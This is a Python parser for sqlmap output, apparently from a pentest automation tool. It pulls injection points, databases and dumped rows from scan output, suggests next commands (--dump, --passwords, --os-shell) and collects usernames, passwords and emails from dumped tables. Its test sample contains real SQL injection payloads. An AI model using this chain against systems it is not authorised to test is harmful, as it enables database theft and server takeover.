#!/usr/bin/env python3
"""
SQLmap Output Parser
Parses SQLmap output and extracts injection details
"""

import re
from typing import Dict, List, Optional


class SQLmapParser:
    """Parse SQLmap output"""
    
    def __init__(self):
        self.injection_pattern = re.compile(r'Parameter:\s*(.+?)\s+\((.+?)\)')
        self.dbms_pattern = re.compile(r'web application technology:\s*(.+)', re.IGNORECASE)
        self.backend_pattern = re.compile(r'back-end DBMS:\s*(.+)', re.IGNORECASE)
        
    def parse(self, output: str, command: str = "") -> Dict:
        """
        Parse SQLmap output
        
        Args:
            output: Raw SQLmap output
            command: Original command
            
        Returns:
            Structured dict with parsed data
        """
        result = {
            'tool': 'sqlmap',
            'command': command,
            'injection_found': False,
            'parameters': [],
            'injection_types': [],
            'dbms': '',
            'databases': [],
            'tables': [],
            'columns': [],
            'dumped_data': [],
            'urls': [],
            'technologies': [],
            'current_user': '',
            'current_db': '',
            'is_dba': False,
            'os_info': ''
        }
        
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Check for injection
            if 'Parameter:' in line and 'is vulnerable' in line.lower():
                result['injection_found'] = True
                
                param_match = self.injection_pattern.search(line)
                if param_match:
                    result['parameters'].append({
                        'name': param_match.group(1).strip(),
                        'type': param_match.group(2).strip()
                    })
            
            # Extract injection types
            if 'Type:' in line:
                injection_type = line.split('Type:')[1].strip()
                if injection_type not in result['injection_types']:
                    result['injection_types'].append(injection_type)
            
            # Extract DBMS
            backend_match = self.backend_pattern.search(line)
            if backend_match:
                result['dbms'] = backend_match.group(1).strip()
            
            # Extract technologies
            tech_match = self.dbms_pattern.search(line)
            if tech_match:
                techs = tech_match.group(1).strip()
                result['technologies'].append(techs)
            
            # Extract database names
            if line.startswith('[*]') and 'available databases' in line.lower():
                # Next lines will be database names
                pass
            elif line.startswith('[*]') and not any(x in line for x in ['heuristic', 'testing', 'fetching']):
                # Potential database name
                db_name = line.replace('[*]', '').strip()
                if db_name and len(db_name) < 50 and ' ' not in db_name:
                    result['databases'].append(db_name)
            
            # Extract current user
            if 'current user:' in line.lower():
                result['current_user'] = line.split(':', 1)[1].strip().strip("'\"")
            
            # Extract current database
            if 'current database:' in line.lower():
                result['current_db'] = line.split(':', 1)[1].strip().strip("'\"")
            
            # Check if DBA
            if 'current user is DBA' in line:
                result['is_dba'] = True
            
            # Extract OS info
            if 'web server operating system:' in line.lower():
                result['os_info'] = line.split(':', 1)[1].strip()
        
        # Extract URL from command
        result['urls'] = self._extract_urls(command)
        
        return result
    
    def parse_databases(self, output: str) -> List[str]:
        """
        Parse database enumeration output
        
        Args:
            output: SQLmap database enumeration output
            
        Returns:
            List of database names
        """
        databases = []
        lines = output.split('\n')
        in_db_section = False
        
        for line in lines:
            line = line.strip()
            
            if 'available databases' in line.lower():
                in_db_section = True
                continue
            
            if in_db_section:
                # Stop at next section
                if line.startswith('[') and ']' in line:
                    in_db_section = False
                    continue
                
                # Extract database name
                if line and not line.startswith('['):
                    db_name = line.strip('[]* ')
                    if db_name:
                        databases.append(db_name)
        
        return databases
    
    def parse_tables(self, output: str) -> Dict[str, List[str]]:
        """
        Parse table enumeration output
        
        Args:
            output: SQLmap table enumeration output
            
        Returns:
            Dict mapping database names to table lists
        """
        tables_by_db = {}
        current_db = None
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Detect database name
            if 'Database:' in line:
                current_db = line.split('Database:')[1].strip()
                tables_by_db[current_db] = []
            
            # Extract table names
            elif current_db and line.startswith('[*]'):
                table_name = line.replace('[*]', '').strip()
                if table_name and len(table_name) < 100:
                    tables_by_db[current_db].append(table_name)
        
        return tables_by_db
    
    def parse_dump(self, output: str) -> List[Dict]:
        """
        Parse dumped data
        
        Args:
            output: SQLmap dump output
            
        Returns:
            List of dumped records
        """
        records = []
        lines = output.split('\n')
        
        # Look for table format
        in_table = False
        columns = []
        
        for line in lines:
            line = line.strip()
            
            # Detect column headers
            if line.startswith('+---') and not in_table:
                in_table = True
                continue
            
            if in_table and '|' in line:
                # Parse row
                cells = [cell.strip() for cell in line.split('|')[1:-1]]
                
                if not columns:
                    # First row is headers
                    columns = cells
                else:
                    # Data row
                    if len(cells) == len(columns):
                        record = dict(zip(columns, cells))
                        records.append(record)
            
            # End of table
            if in_table and line.startswith('+---'):
                in_table = False
                columns = []
        
        return records
    
    def _extract_urls(self, text: str) -> List[str]:
        """Extract URLs from text"""
        url_pattern = re.compile(r'https?://[^\s]+')
        urls = url_pattern.findall(text)
        return urls
    
    def get_recommendations(self, parsed_data: Dict) -> List[str]:
        """
        Get recommended next steps
        
        Args:
            parsed_data: Parsed SQLmap data
            
        Returns:
            List of recommended commands
        """
        recommendations = []
        url = parsed_data['urls'][0] if parsed_data['urls'] else 'TARGET_URL'
        
        if parsed_data['injection_found']:
            # Enumeration recommendations
            if not parsed_data['databases']:
                recommendations.append(f"sqlmap -u {url} --dbs")
            
            elif not parsed_data['tables']:
                for db in parsed_data['databases'][:2]:
                    recommendations.append(f"sqlmap -u {url} -D {db} --tables")
            
            else:
                recommendations.append(f"sqlmap -u {url} -D {parsed_data['current_db']} --dump")
            
            # Advanced options
            recommendations.extend([
                f"sqlmap -u {url} --users",
                f"sqlmap -u {url} --passwords",
                f"sqlmap -u {url} --current-user",
                f"sqlmap -u {url} --is-dba",
                f"sqlmap -u {url} --os-shell"
            ])
        
        return recommendations
    
    def extract_credentials(self, dumped_data: List[Dict]) -> List[Dict]:
        """
        Extract credentials from dumped data
        
        Args:
            dumped_data: List of dumped records
            
        Returns:
            List of credential dicts
        """
        credentials = []
        
        for record in dumped_data:
            # Look for common credential column names
            username = None
            password = None
            email = None
            
            for key, value in record.items():
                key_lower = key.lower()
                
                if any(x in key_lower for x in ['user', 'login', 'username']):
                    username = value
                elif any(x in key_lower for x in ['pass', 'password', 'pwd']):
                    password = value
                elif 'email' in key_lower or 'mail' in key_lower:
                    email = value
            
            if username or password or email:
                credentials.append({
                    'username': username,
                    'password': password,
                    'email': email,
                    'source': 'sqlmap_dump'
                })
        
        return credentials


if __name__ == "__main__":
    # Test parser
    test_output = """
[*] testing connection to the target URL
[*] testing if the target URL content is stable
[*] testing if GET parameter 'id' is dynamic
[*] confirming that GET parameter 'id' is dynamic
[*] heuristic (basic) test shows that GET parameter 'id' might be injectable
[*] testing for SQL injection on GET parameter 'id'
[*] testing 'AND boolean-based blind - WHERE or HAVING clause'
[*] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[*] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5963=5963

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 1234 FROM(SELECT COUNT(*),CONCAT(0x71626a7071,(SELECT (ELT(1234=1234,1))),0x7178627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
---
[*] the back-end DBMS is MySQL
web application technology: Apache 2.4.18, PHP 5.6.24
back-end DBMS: MySQL >= 5.0
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] testdb
[*] webapp
"""
    
    parser = SQLmapParser()
    result = parser.parse(test_output)
    
    print("Parsed Data:")
    print(f"Injection Found: {result['injection_found']}")
    print(f"DBMS: {result['dbms']}")
    print(f"Databases: {result['databases']}")
    print(f"Injection Types: {result['injection_types']}")
    
    print("\nRecommendations:")
    for cmd in parser.get_recommendations(result)[:5]:
        print(f"  - {cmd}")
